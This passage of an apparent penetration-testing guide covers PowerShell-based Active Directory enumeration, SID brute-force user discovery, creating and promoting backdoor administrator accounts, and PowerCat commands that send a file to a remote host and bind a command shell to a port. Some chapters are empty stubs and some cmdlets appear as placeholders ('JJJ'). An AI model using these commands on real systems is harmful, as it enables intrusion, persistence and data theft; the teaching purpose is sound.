We can get information about a forest that a computer is part of as follows:
```powershell
PS C:\> get-adforest

ApplicationPartitions : {DC=DomainDnsZones,DC=snowcapcyber,DC=co,DC=uk, DC=ForestDnsZones,DC=snowcapcyber,DC=co,DC=uk}
CrossForestReferences : {}
DomainNamingMaster    : DC-01.snowcapcyber.co.uk
Domains               : {snowcapcyber.co.uk}
ForestMode            : Windows2012Forest
GlobalCatalogs        : {DC-01.snowcapcyber.co.uk}
Name                  : snowcapcyber.co.uk
PartitionsContainer   : CN=Partitions,CN=Configuration,DC=snowcapcyber,DC=co,DC=uk
RootDomain            : snowcapcyber.co.uk
SchemaMaster          : DC-01.snowcapcyber.co.uk
Sites                 : {Default-First-Site-Name}
SPNSuffixes           : {}
UPNSuffixes           : {}
```

We can expand our analysis of an Active Directory by identifying the number of computers with a domain.

```powershell
PS C:\> get-adcomputer -filter * -Server DC-01.snowcapcyber.co.uk

DistinguishedName : CN=DC-01,OU=Domain Controllers,DC=snowcapcyber,DC=co,DC=uk
DNSHostName       : DC-01.snowcapcyber.co.uk
Enabled           : True
Name              : DC-01
ObjectClass       : computer
ObjectGUID        : d3ed3abe-9394-406b-8f85-29e66dbce6ef
SamAccountName    : DC-01$
SID               : S-1-5-21-345604638-380621598-4273189824-1002
UserPrincipalName :

DistinguishedName : CN=WKSTN-01,CN=Computers,DC=snowcapcyber,DC=co,DC=uk
DNSHostName       : wkstn-01.snowcapcyber.co.uk
Enabled           : True
Name              : WKSTN-01
ObjectClass       : computer
ObjectGUID        : da481833-8e61-4cbe-bf6b-73d0be1879d0
SamAccountName    : WKSTN-01$
SID               : S-1-5-21-345604638-380621598-4273189824-1109
UserPrincipalName :
```

Once we have profiled the Active Directory we can try to create a user. The following will create a user and then prompt us to enter the password.

```powershell
PS C:\> New-ADUser -Name "Andrew J C Blyth" -Accountpassword (Read-Host -AsSecureString "AccountPassword") -Enabled $true
```

In the following we use the New-ADUser command to create a new user and provide a details on the user to the Active Directory.

```powershell
PS C:\> New-ADUser -Name "John Smith" -GivenName "John" -Surname "Smith" -SamAccountName "J.Smith" -UserPrincipalName "J.Smith@snowcapcyber.co.uk -Path "OU=PenTesters,DC=snowcapcyber,DC=co,DC=uk" -AccountPassword(Read-Host -AsSecureString "Input Password") -Enabled $true
```

We can also search an Active Directory to identify users that are disabled.

```powershell
PS C:\> Search-ADAccount -AccountDisabled -UsersOnly | FT Name,ObjectClass -A
Name                    ObjectClass
----                    -----------
Iain Sutherland         user
Huw Read                user
Kosta Xynos             user
```

We will now use PowerShell to reset a users password as follows:

```powershell
PS C:\> Set-ADAccountPassword -Identity "CN=John Smith,OU=PenTesters,DC=snowcapcyber,DC=co,DC=uk" -Reset -NewPassword (ConvertTo-SecureString -AsPlainText "p@ssw0rd" -Force)
```

The Enable-ADAccount cmdlet enables an Active Directory user, computer, or service account. In the following we will enabled a disabled account.

```powershell
PS C:\> Enable-ADAccount -Identity "CN=Iain Sutherland ,OU=PenTesters,DC=snowcapcyber,DC=co,DC=uk"
```

Or we can search for accounts that have expired.

```powershell
PS C:\> Search-ADAccount -AccountExpiring -TimeSpan 6.00:00:00 | FT Name,ObjectClass -A
Name           ObjectClass
----           -----------
John Smith     user
```

The Clear-ADAccountExpiration cmdlet clears the expiration date for an Active Directory user or computer account. When you clear the expiration date for an account, the account does not expire.

```powershell
PS C:\>  Clear-ADAccountExpiration -Identity JSmith
```

We can also use a distinguished name when clearing an account.

```powershell
PS C:\>  Clear-ADAccountExpiration -Identity "CN=John Smith,OU=PenTesters,DC=snowcapcyber,DC=co,DC=uk"
```

## Chapter 10 - Azure

```powershell
PS C:\>
```

## Chapter 11 - SQL Database

```powershell
PS C:\> Execute-Command-MSSQL
```

## Chapter 12 - Domain Name System (DNS)

```powershell
PS C:\> Test-DNSRecord
```

```powershell
PS C:\> Resolve-DNSName
```

## Chapter 13 - Simple Network Management Protocol (SNMP)

```powershell
PS C:\>
```

## Chapter 14 - Brute Forcing

Once we have identified a series of TCP services that support authentication then we cab start to Brute force a connection to them. To do this we will make use of the following tools.

* [Offensive PowerShell](https://github.com/samratashok/nishang)

```powershell
PS C:\>
```

## Chapter 15 - User Profiling

Once we have exploited a system we start to profile a system using a set of PowerShell commands. We can start be listing the users on the target system.
```powershell
PS C:\> Get-LocalUser
Name               Enabled Description
----               ------- -----------
Administrator      False   Built-in account for administering the computer/domain
andre              True
Andrew Blyth       True
DefaultAccount     False   A user account managed by the system.
Guest              False   Built-in account for guest access to the computer/domain
WDAGUtilityAccount False   A user account managed and used by the system for Windows
```

Now that we have a list of users we profile a given user in greater detail. To achieve this we use the JJJ command and specify the username that we are interested in.
```powershell
PS C:\> Get-LocalUser -name "Andrew Blyth" | select *
AccountExpires         :
Description            :
Enabled                : True
FullName               :
PasswordChangeableDate : 02/07/2022 21:09:44
PasswordExpires        :
UserMayChangePassword  : True
PasswordRequired       : False
PasswordLastSet        : 02/07/2022 21:09:44
LastLogon              : 19/08/2022 17:14:13
Name                   : Andrew Blyth
SID                    : S-1-5-21-5082059827-597078506-5194163137-1011
PrincipalSource        : Local
ObjectClass            : User
```

Our next step is to identify the SID associated with a specific user.. The SID of a user allows us to identify the RID and Domain SID.

```powershell
PS C:\> $username='ajcblyth'
PS C:\> $user = New-Object System.Security.Principal.NTAccount($username)
PS C:\> $sid = $user.Translate([System.Security.Principal.SecurityIdentifier])
PS C:\> $sid.Value

S-1-5-21-5082059827-597078506-5194163137-1011
```

Once we have identified a SID for a given domain then we can start to use it to identify other users within a domain.
```powershell
$sid='S-1-5-21-5082059827-597078506-5194163137-1025'
$osid = New-Object System.Security.Principal.SecurityIdentifier($sid)
$user = $osid.Translate( [System.Security.Principal.NTAccount])
$user.Value
```

The above script will profile the following output.
```powershell
SNOWCAPCYBER\isutherland
```

Because PowerShell is a scripting language it support a set of commands designed to allow for system administration.  Once of these commands will allow is to query an Active Directory and get a user's SID. In the following we will use the Get-ADUser command.

```powershell
PS C:\> Get-ADUser -Identity 'ajcblyth' | select SID
```

The above script will allow us to identify the SID associated with the username ajcblyth. It will produce the following output.
```powershell
SID
---
S-1-5-21-1528183062-2169693211-1356664787-1205
```

Once we know the SID for the Domain we can then start to cycle through the SID and query every SID in the domain. To do this we make use of a for loop and function that allows us to query the Domain for a given SID. This is shown as follows
```powershell
for ($counter=1; $counter -le 65535 ; $counter++)
{
  $sid = 'S-1-5-21-1528183062-2169693211-1356664787-'+$counter
  $osid = new-object System.Security.Principal.SecurityIdentifier($sid)
  $user = $osid.Translate([System.Security.Principal.NTAccount])
  $user.value
}
```

All of the above let us profile a users within a domain. Once we have profiled user we can look to create a user on the local system or on a Active Directory. In the following we will create a user on a local system. Once we have created a local account we can verify that we have been successful vi a the Get-LocalUser PowerShell command.
```powershell
PS C:\> $PASSWORD= ConvertTo-SecureString –AsPlainText -Force -String MyPa55w0rD
PS C:\> New-LocalUser -Name "jsmith" -Description "John Smith" -Password $PASSWORD
```

Once we have created a local account the next thing that we want to do is to add the account to the local Administrator group. To do this we make use of the Add-LocalGroupMember command.
```powershell
PS C:\> Add-LocalGroupMember -Group "Administrators" -Member "jsmith"
```

Once we have created a new local account and added it to a group then we can check this as follows:
```powershell
PS C:\> Get-LocalGroupMember -Group "Administrators"
ObjectClass Name                 PrincipalSource
----------- ----                 ---------------
User        WIN11\Administrator  Local
User        WIN11\jsmith         Local
```

## Chapter 16 - Profiling Local/Remote Systems

Profiling the target system starts with us profiling the execution policy. The Execution policy defines how, when and where PowerShell Scripts can be executed. To identify the execution policy we can use the Get-ExecutionPolicy PowerShell command.
```powershell
PS C:\>  Get-ExecutionPolicy
```

If you wish to change the PowerShell policy only to the current user, use the following command instead.
```powershell
PS C:\>  Set-ExecutionPolicy -ExecutionPolicy Unrestricted -Scope CurrentUser
```

Profiling a local system starts with is identifying how the device's device is configured. To achieve this we can make use of the JJ PowerShell cmdlet.
```powershell
PS C:\> Get-NetIPConfiguration

InterfaceAlias       : Ethernet0
InterfaceIndex       : 13
InterfaceDescription : Intel(R) 82574L Gigabit Network Connection
NetProfile.Name      : snowcapcyber.co.uk
IPv4Address          : 192.168.2.101
IPv4DefaultGateway   : 192.168.2.254
DNSServer            : 192.168.2.11
```

Profiling the target system continues with us identifying the TCP and UDP ports that are being used. To identify all TCP ports that are being used we can use the  Get-NetTCPConnection PowerShell command as follows.
```powershell
PS C:\>  Get-NetTCPConnection
LocalAddress     LocalPort RemoteAddress   RemotePort State       AppliedSetting
------------     --------- -------------   ---------- -----       --------------
::               445       ::              0          Listen                    
::               135       ::              0          Listen                    
0.0.0.0          65144     0.0.0.0         0          Bound                     
0.0.0.0          65051     0.0.0.0         0          Bound                     
0.0.0.0          49301     0.0.0.0         0          Bound                     
192.168.1.121    65144     21.58.222.106   443        CloseWait   Internet
192.168.1.121    50577     5.32.165.224    3389       Established Internet
192.168.1.121    50409     14.18.226.52    443        Established Internet      
```

We can also use the Get-NetTCPConnection command to identify all TCP ports that are in state Listen.
```powershell
PS C:\>  Get-NetTCPConnection - State Listen
LocalAddress  LocalPort RemoteAddress RemotePort State       AppliedSetting
------------  --------- ------------- ---------- -----       --------------
::            49669     ::            0          Listen                    
0.0.0.0       49669     0.0.0.0       0          Listen                    
0.0.0.0       912       0.0.0.0       0          Listen                    
0.0.0.0       902       0.0.0.0       0          Listen                    
0.0.0.0       135       0.0.0.0       0          Listen                    
```

We can also profile the UDP open ports that have connections to them as follows.
```powershell
PS C:\> Get-NetUDPEndpoint
LocalAddress      LocalPort
------------      ---------
192.168.1.121     1900
169.254.100.173   1900
127.0.0.1         1900
192.168.1.1       138
192.168.1.1       137
```

Or we can list all the UDP ports in the listening state.

```powershell
PS C:\> Get-NetUDPEndpoint -LocalAddress 0.0.0.0
LocalAddress   LocalPort
------------   ---------
0.0.0.0        60108
0.0.0.0        60107
0.0.0.0        54542
0.0.0.0        5355
0.0.0.0        5353
```

Once we have identified the TCP and UDP that are being used by the target system the next stage is to profile the services that are running. To achieve this we will use the Get-Service command.
```powershell
PS C:\> Get-Service

Status   Name               DisplayName
------   ----               -----------
Stopped  AarSvc_be149       Agent Activation Runtime_be149
Running  AdobeARMservice    Adobe Acrobat Update Service
```

Once we have a list of all process on the target system we can filter the output and look for running process.
```powershell
PS C:\> get-service | where-object {$_.Status -eq "Running"}

Status   Name               DisplayName
------   ----               -----------
Running  AdobeARMservice    Adobe Acrobat Update Service
Running  Appinfo            Application Information
Running  AppXSvc            AppX Deployment Service (AppXSVC)
Running  AudioEndpointBu... Windows Audio Endpoint Builder

```

Now that we now the services that are running we can gather information relating to the services such as the account under which the service is running and the location of the executable of the service, and the parameters used to invoke the service.
```powershell
PS C:\> Get-WmiObject win32_service | format-table -AutoSize Name, Startname, Startmode, PathName | Out-String -Width 4096

Name      Startname                   Startmode PathName   
----      ---------                   --------- --------   
Dhcp      NT Authority\LocalService   Auto      C:\Windows\system32\svchost.exe -k LocalServiceNetworkRestricted -p      
Dnscache  NT AUTHORITY\NetworkService Auto      C:\Windows\system32\svchost.exe -k NetworkService -p                     
```

We can further out understand of the services running my examining what services are making use of network ports to communicate with the outside world.
```powershell
PS C:\> Get-NetTCPConnection -State Listen |Select-Object -Property LocalPort, State, @{name='ProcessID';expression={(Get-Process -Id $_.OwningProcess). ID}}, @{name='ProcessName';expression={(Get-Process -Id $_.OwningProcess). Path}}

LocalPort  State ProcessID ProcessName
---------  ----- --------- -----------
      135 Listen      1148 C:\Windows\system32\svchost.exe
      912 Listen      3708 C:\Program Files (x86)\VMware\VMware Player\vmware-authd.exe
      902 Listen      3708 C:\Program Files (x86)\VMware\VMware Player\vmware-authd.exe
```

We can expand upon this analysis to include the accounts under which the services ate executing
```powershell
PS C:\> Get-NetTCPConnection -State Listen |Select-Object -Property LocalPort, State, @{name='ProcessID';expression={(Get-Process -IncludeUserName -Id $_.OwningProcess). ID}}, @{name='ProcessName';expression={(Get-Process -IncludeUserName -Id $_.OwningProcess). Path}}, @{name='User';expression={(Get-Process -IncludeUserName -Id $_.OwningProcess). Username}}  | Format-Table -Property * -AutoSize | Out-String -Width 4096

LocalPort  State ProcessID ProcessName                                                  User
---------  ----- --------- -----------                                                  ----
      135 Listen      1148 C:\Windows\system32\svchost.exe                              NT AUTHORITY\NETWORK SERVICE
      912 Listen      3708 C:\Program Files (x86)\VMware\VMware Player\vmware-authd.exe NT AUTHORITY\SYSTEM
      902 Listen      3708 C:\Program Files (x86)\VMware\VMware Player\vmware-authd.exe NT AUTHORITY\SYSTEM
```

The above will list all running processes on the target system. Now that we have an understanding of the process that are running and usernames on the target system we can begin to examine other aspects such as the SMB shares exported. To identify the list of SMB shares on a local machine can use the Get-SMBShare command.
```powershell
PS C:> Get-SMBShare
Name   ScopeName Path       Description
----   --------- ----       -----------
ADMIN$ *         C:\Windows Remote Admin
C$     *         C:\        Default share
D$     *         D:\        Default share
E$     *         E:\        Default share
IPC$   *                    Remote IPC
```

Once we have a list of export SMB shares we can profile the access rights on the target system via the JJJ command. Using the HHH command we specify the name of the share that we wish profile.
```powershell
PS C:\> Get-SmbShareAccess -Name C$

Name     ScopeName AccountName               AccessControlType AccessRight
----     --------- -----------               ----------------- -----------
C$       *         BUILTIN\Administrators    Allow             Full
C$       *         NT AUTHORITY\INTERACTIVE  Allow             Full
```

We can make create a new CimSession and the use this as a parameter to the Get-SmbShare command to query the SMB shares on the remote system. This is illustrate as follows
```powershell
$sessionDC01 = New-CimSession -ComputerName dc01.snowcapcyber.com
Get-SmbShare -CimSession $sessionDC01
```

We can also use the Invoke-Command PowerShell command to profile the SMB shares exported by other target systems connected to the network. We achieve this via using the ability of PowerShell to connect to other systems and execute remote commands.
```powershell
PS C:\> Invoke-Command -ComputerName 'dc01.snowcapcyber.com' -ScriptBlock {Get-SmbShare}
```

We can achieve the same results using the WmiObject interface as follows:
```powershell
PS C:\> Get-WmiObject -Class Win32_Share -ComputerName DC01
```

We can also profile the local and remote machines using the Get-HotFix command. In the following example we will list all of the HotFixes that have been applied.

```powershell
PS C:\> Get-HotFix

Source        Description      HotFixID      InstalledBy          InstalledOn
------        -----------      --------      -----------          -----------
WKSTN-01      Update           KB5013624     NT AUTHORITY\SYSTEM  19/11/2022 00:00:00
WKSTN-01      Update           KB4562830     NT AUTHORITY\SYSTEM  19/11/2022 00:00:00
WKSTN-01      Security Update  KB4570334                          18/11/2020 00:00:00
WKSTN-01      Update           KB4577586     NT AUTHORITY\SYSTEM  18/11/2022 00:00:00
WKSTN-01      Security Update  KB4580325                          19/11/2020 00:00:00
WKSTN-01      Security Update  KB4586864                          19/11/2020 00:00:00
WKSTN-01      Security Update  KB5013942     NT AUTHORITY\SYSTEM  19/11/2022 00:00:00
WKSTN-01      Security Update  KB5014032     NT AUTHORITY\SYSTEM  18/11/2022 00:00:00
```

Can can also use Get-HotFix command to profile the applied HotFixes on a target system. In the following the system that we are targeting is dc01.snowcapcyber.co.uk and the username that we are using is SNOWCAPCYBER\ajcblyth.

```powershell
PS C:\> Get-HotFix -ComputerName dc01.snowcapcyber.co.uk -Credential SNOWCAPCYBER\ajcblyth
```

We can also the Invoke-Command command to execute a remote commands on a target system. In the following we will use the Invoke-Command command to execute the Get-HotFix command on the target system dc03.snowcapcyber.co.uk.

```powershell
PS C:\> Invoke-Command -ComputerName dc03.snowcapcyber.co.uk -ScriptBlock { Get-HotFix }
```

We can also use PowerShell to create a back door to the target system.

* [PowerCat](https://github.com/besimorhino/powercat)

The [PowerCat](https://github.com/besimorhino/powercat) tool allows us to send and receive data as well as bind a shell to a TCP port. By default, [PowerCat](https://github.com/besimorhino/powercat) reads input from the console and writes input to the console using write-host. In the following we will use [PowerCat](https://github.com/besimorhino/powercat) to receive some data.
```powershell
PS C:\> powercat -l -p 8000 -of C:\inputfile
```

In the following we will use [PowerCat](https://github.com/besimorhino/powercat) to send some data to the target 10.1.1.1
```powershell
PS C:\> powercat -c 10.1.1.1 -p 443 -i C:\inputfile
```

We can also use [PowerCat](https://github.com/besimorhino/powercat) to bind a TCP port to shell.
```powershell
PS C:\> powercat -l -p 443 -e cmd
```

## Recommended Reading

* [Chris Dent, Mastering PowerShell Scripting: Automate and manage your environment using PowerShell 7.1, Packt, 2021](https://www.amazon.co.uk/Mastering-PowerShell-Scripting-Automate-environment/dp/1800206542/ref=sr_1_4?crid=JF1OK6S95NY2&keywords=powershell&qid=1668186716&s=books&sprefix=powershell%2Cstripbooks%2C64&sr=1-4)

* [Lee Holmes, PowerShell Cookbook: Your Complete Guide to Scripting the Ubiquitous Object-Based Shell, O'Reilly, 2021](https://www.amazon.co.uk/PowerShell-Cookbook-Scripting-Ubiquitous-Object-Based/dp/109810160X/ref=sr_1_5?crid=JF1OK6S95NY2&keywords=powershell&qid=1668186716&s=books&sprefix=powershell%2Cstripbooks%2C64&sr=1-5)

* [Tim Bryant, PTFM: Purple Team Field Manual, Independently Published, 2020](https://www.amazon.co.uk/PTFM-Purple-Team-Field-Manual/dp/B08LJV1QCD/ref=sr_1_1?crid=BR8A8SAS3HCN&keywords=ptfm&qid=1657708194&sprefix=ptfm%2Caps%2C167&sr=8-1)

* [Adam Bertram, PowerShell for SysAdmins, No Starch Press, 2022](https://www.amazon.co.uk/Automate-Boring-Stuff-Powershell-Sysadmins/dp/1593279183)

* [Chris McNab, Network Security Assessment: Know Your Network, 3rd Edition, O'Reilly, 2016](https://www.amazon.co.uk/Network-Security-Assessment-Know-Your/dp/149191095X/ref=sr_1_1?crid=2RI4CBCKBC79C&keywords=network+security+assessment&qid=1657708066&sprefix=network+security+a%2Caps%2C63&sr=8-1)

* [Douglas E. Comer, Internetworking With Tcp/Ip Volume I: Principles, Protocol, And Architecture, 6th Edition, Pearson, 2015](https://www.amazon.co.uk/Internetworking-Tcp-Ip-Principles-Architecture/dp/9332550107/ref=sr_1_2?qid=1657708327&refinements=p_27%3ADouglas+E.+Comer&s=books&sr=1-2&text=Douglas+E.+Comer)

* [Douglas Finke, PowerShell for Developers, O'Reilly, 2012](https://www.amazon.co.uk/Windows-PowerShell-Developers-Douglas-Finke/dp/1449322700/ref=sr_1_1?crid=2LE0JHVCRT3KN&keywords=PowerShell+for+Developers&qid=1668961617&s=books&sprefix=powershell+for+developers%2Cstripbooks%2C185&sr=1-1)

## Contact Details

For further information and questions please contact Dr Andrew Blyth, PhD. <ajcblyth@snowcapcyber.com>.
